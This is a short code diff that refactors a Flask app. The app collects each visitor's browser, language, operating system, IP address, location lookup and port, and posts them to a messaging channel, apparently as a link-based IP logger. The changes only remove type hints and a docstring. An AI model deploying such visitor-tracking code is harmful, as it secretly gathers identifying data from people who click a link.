@@ -2,15 +2,11 @@ import requests
 from flask import Flask, redirect, send_from_directory, request
 from flask_ipinfo import IPInfo
 
-app: Flask = Flask(__name__)
-ip_info: IPInfo = IPInfo()
+app = Flask(__name__)
+ip_info = IPInfo()
 
 
 def send_to_channel(text: str = None):
-    """
-
-    :type text: str
-    """
     data = {
         "chat_id": "@dssdfkdsafkadsk",
         "text": text
@@ -21,7 +17,7 @@ def send_to_channel(text: str = None):
 
 
 def send_user_info(remote_port):
-    text: str = f"Browser: {ip_info.browser}\nЯзык: {ip_info.lang}\nОС: {ip_info.os}\nIP: {ip_info.ipaddress}\n{ip_info.get_info}, PORT: {remote_port}"
+    text = f"Browser: {ip_info.browser}\nЯзык: {ip_info.lang}\nОС: {ip_info.os}\nIP: {ip_info.ipaddress}\n{ip_info.get_info}, PORT: {remote_port}"
     return send_to_channel(text)
 
 
